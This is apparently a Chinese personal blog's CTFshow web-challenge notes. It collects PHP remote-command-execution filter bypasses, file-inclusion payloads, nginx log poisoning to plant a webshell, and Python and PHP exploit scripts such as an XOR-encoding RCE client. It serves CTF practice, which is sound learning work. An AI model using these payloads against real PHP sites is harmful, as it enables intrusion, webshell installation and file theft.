<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>RAIN</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: '确认'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async type="module">import { init } from '//unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://talk.israinstop.com/',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.1.1"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1></h1></div><hr><div id="post-content"><h1 id="CTFshow笔记"><a href="#CTFshow笔记" class="headerlink" title="CTFshow笔记"></a>CTFshow笔记</h1><h4 id="1"><a href="#1" class="headerlink" title="1"></a><strong>1</strong></h4><p>查看源码</p>
<hr>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a><strong>2</strong></h4><hr>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a><strong>3</strong></h4><p>抓包，flag在响应里面</p>
<hr>
<h4 id="29"><a href="#29" class="headerlink" title="29"></a><strong>29</strong></h4><p>传入c参数，不能含flag，可以用通配符绕过，eval函数将字符串当作php代码执行,所以用system(‘cat *lag.php’)</p>
<hr>
<h4 id="30"><a href="#30" class="headerlink" title="30"></a><strong>30</strong></h4><p>过滤了system，flag和php，直接passthru(‘cat fl*’);</p>
<hr>
<h4 id="31"><a href="#31" class="headerlink" title="31"></a><strong>31</strong></h4><p>过滤了”cat sort shell”以及，点，空格，单引号</p>
<p>1.由于只对参数c进行了过滤，所以可以获取其他参数，c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“cat fl*”)</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br><br>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&quot;.&quot;<br>pos():输出数组第一个元素，不改变指针；<br>scandir();遍历目录，这里因为参数为&quot;.&quot;所以遍历当前目录<br>array_reverse():元组倒置<br>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以<br>show_source():查看源码<br></code></pre></td></tr></table></figure>

<p>3.%09，{$IFS},$IFS$9 绕过空格</p>
<hr>
<h4 id="32"><a href="#32" class="headerlink" title="32"></a><strong>32</strong></h4><p>文件包含 日志注入<br>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号<br>再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了，但是php中也有不需要括号的函数，如：<br>echo 123;<br>print 123;<br>die;<br>include “&#x2F;etc&#x2F;passwd”;<br>require “&#x2F;etc&#x2F;passwd”;<br>include_once “&#x2F;etc&#x2F;passwd”;<br>require_once “etc&#x2F;passwd”;<br>这里我们利用include构造payload<br>url&#x2F;?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag<br>还有一种方法，日志注入<br>url&#x2F;?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p>
<hr>
<h4 id="37"><a href="#37" class="headerlink" title="37"></a><strong>37</strong></h4><hr>
<h4 id="39"><a href="#39" class="headerlink" title="39"></a><strong>39</strong></h4><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p>
<hr>
<h4 id="40"><a href="#40" class="headerlink" title="40"></a><strong>40</strong></h4><p>无参数RCE</p>
<h5 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h5><p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p>
<p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p>
<h5 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h5><p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p>
<p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p>
<p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p>
<p>pos():输出数组第一个元素，不改变指针；</p>
<p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p>
<p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p>
<p>array_reverse():数组逆置</p>
<p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p>
<p>show_source():查看源码</p>
<p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p>提示：该函数不会移动数组内部指针。</p>
<p>相关的方法：</p>
<p>current()返回数组中的当前元素的值。</p>
<p>end()将内部指针指向数组中的最后一个元素，并输出。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>prev()将内部指针指向数组中的上一个元素，并输出。</p>
<p>reset()将内部指针指向数组中的第一个元素，并输出。</p>
<p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p>
<hr>
<h4 id="41"><a href="#41" class="headerlink" title="41"></a><strong>41</strong></h4><p>异或绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xor.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>	<span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>			<span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>		&#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>			<span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>		&#125;<br>		<span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br>		<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>		<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>		<span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>			<span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>		&#125;<br>	&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python xor.py</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php xor.php&quot;</span>)  <span class="hljs-comment">#没有将php写入环境变量需手动运行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function:&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command:&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br><br></code></pre></td></tr></table></figure>

<hr>
<h4 id="42"><a href="#42" class="headerlink" title="42"></a><strong>42</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显#重定向至&#x2F;dev&#x2F;null即丢弃<br>; &#x2F;&#x2F;分号<br>| &#x2F;&#x2F;只执行后面那条命令<br>|| &#x2F;&#x2F;只执行前面那条命令<br>&amp; &#x2F;&#x2F;两条命令都会执行<br>&amp;&amp; &#x2F;&#x2F;两条命令都会执行</p>
</blockquote>
<p>可构造playload:<br>url&#x2F;?c&#x3D;tac flag.php||<br>url&#x2F;?c&#x3D;tac flag.php%26<br>注意，这里的&amp;需要url编码</p>
<hr>
<h4 id="43"><a href="#43" class="headerlink" title="43"></a><strong>43</strong></h4><p>比42题多过滤了cat和分号，那就用tac和||，不过||要url编码成%7C%7C</p>
<p>也可以用\绕过</p>
<hr>
<h4 id="44"><a href="#44" class="headerlink" title="44"></a><strong>44</strong></h4><p>多过滤flag，通配符绕过?c&#x3D;tac f*%7C%7Cls</p>
<hr>
<h4 id="45"><a href="#45" class="headerlink" title="45"></a><strong>45</strong></h4><p>多过滤了空格，用$IFS$9或%09（table制表符）或%5C（反斜杠）绕过</p>
<hr>
<h4 id="46"><a href="#46" class="headerlink" title="46"></a><strong>46</strong></h4><p>‘&#x2F;;|cat|flag| |[0-9]|\$|*&#x2F;i’</p>
<p>?c&#x3D;tac%09fla?.php%7C%7Cls</p>
<hr>
<h4 id="47"><a href="#47" class="headerlink" title="47"></a><strong>47</strong></h4><p>?c&#x3D;uniq%09fla?.php%7C%7Cls</p>
<p>uniq nl tac都可以</p>
<hr>
<h4 id="48"><a href="#48" class="headerlink" title="48"></a><strong>48</strong></h4><hr>
<h4 id="56"><a href="#56" class="headerlink" title="56"></a><strong>56</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import time<br>import requests<br><br>url = &quot;http://7c7374da-7245-4232-8215-59ae33ec2825.challenge.ctf.show/&quot;<br>payload = &#123;&quot;c&quot;:&quot;. /???/????????[@-[]&quot;&#125;<br><br><br>with open(&#x27;.\\1.txt&#x27;,&#x27;r&#x27;) as file:<br>    files = &#123;&#x27;file&#x27;: file&#125;<br>    while 1:<br>        r = requests.post(url,params=payload,files=files)<br><br>        if r.text:<br>            print(&quot;\n&quot; + r.text)<br>            break<br><br>        time.sleep(1)<br>        print(&quot;.&quot;, end=&#x27; &#x27;,flush=True)<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//1.txt<br><span class="hljs-built_in">cat</span> flag.php<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="57"><a href="#57" class="headerlink" title="57"></a><strong>57</strong></h4><p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p>
<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p>
<p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p>
<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36:</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">get_reverse_number = <span class="hljs-string">&quot;$((~$((&#123;&#125;))))&quot;</span> <span class="hljs-comment"># 取反操作</span><br>negative_one = <span class="hljs-string">&quot;$((~$(())))&quot;</span>		<span class="hljs-comment"># -1</span><br>payload = get_reverse_number.<span class="hljs-built_in">format</span>(negative_one*<span class="hljs-number">37</span>)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>

<p>~x&#x3D;-x-1</p>
<p>~100&#x3D;-100-1</p>
<p>首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0<br>所以: ~100 的二进制表示为：1001 1011 所以等号左边&#x3D;1001 1011</p>
<p>再看右边<br>-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1&#x3D;-x 所以，我们把101按位取反加一 先取反：<br>~101&#x3D;10011010 再加一： ~101+1&#x3D;10011011&#x3D;-101 所以等号右边&#x3D;10011011&#x3D;左边，所以等号成立。</p>
<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
<hr>
<h4 id="58"><a href="#58" class="headerlink" title="58"></a><strong>58</strong></h4><p>各种命令执行的函数都用不了</p>
<p>先c&#x3D;print_r(scandir(getcwd()));查看当前目录下的文件(也可以<strong>pos(localeconv()))<strong>替换</strong>getcwd()</strong>)</p>
<p>两种解法<br>POST传参：c&#x3D;highlight_file(“flag.php”);(**show_source()<strong>和</strong>file_get_contents()**也行)<br>POST传参：c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<hr>
<h4 id="59"><a href="#59" class="headerlink" title="59"></a>59</h4><p>同上</p>
<hr>
<h4 id="60"><a href="#60" class="headerlink" title="60"></a><strong>60</strong></h4><p>同上</p>
<hr>
<h4 id="61"><a href="#61" class="headerlink" title="61"></a><strong>61</strong></h4><hr>
<h4 id="66"><a href="#66" class="headerlink" title="66"></a><strong>66</strong></h4><p>发现flag不在当前目录里面的flag.php里</p>
<p>print_r(scandir(‘&#x2F;‘));看一下根目录，发现flag.txt</p>
<p>直接highlight_file(‘&#x2F;flag.txt’);</p>
<hr>
<h4 id="67"><a href="#67" class="headerlink" title="67"></a>67</h4><p>不能用print_r了，就用var_dump</p>
<hr>
<h4 id="68"><a href="#68" class="headerlink" title="68"></a>68</h4><p>同样flag在&#x2F;flag.txt</p>
<p>不能用highlight_file()和file_get_contents()</p>
<p>那就文件包含</p>
<p>c&#x3D;include($_POST[1]);&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt</p>
<p>var_dump((new SplFileObject(“flag.txt”))-&gt;fpassthru());</p>
<hr>
<h4 id="69"><a href="#69" class="headerlink" title="69"></a>69</h4><p>不能用var_dump()了</p>
<p>可以用**debug_zval_dump()<strong>和</strong>var_export()**替代</p>
<p>print和echo无法打印数组，也可以利用<strong>implode</strong>函数将数组转换成字符串再打印</p>
<p>echo(implode(‘—‘,scandir(‘&#x2F;‘)));</p>
<p>implode()第一个参数为分隔符</p>
<p>也可以用<strong>json_encode()</strong></p>
<p>c&#x3D;echo json_encode(scandir(‘&#x2F;‘));</p>
<p>读取函数readgzfile：可以读取非gz格式的文件</p>
<hr>
<h4 id="71"><a href="#71" class="headerlink" title="71"></a>71</h4><p>提前送出缓冲区或终止程序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure>

<p>源码劫持了输出缓冲并且将数字和字母替换成了<code>?</code>。</p>
<h5 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h5><p>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ob_flush</span>();<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br></code></pre></td></tr></table></figure>

<p>payload示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-title function_ invoke__">ob_flush</span>();<br></code></pre></td></tr></table></figure>

<h5 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h5><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">exit</span>();<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure>

<p>payload示例：</p>
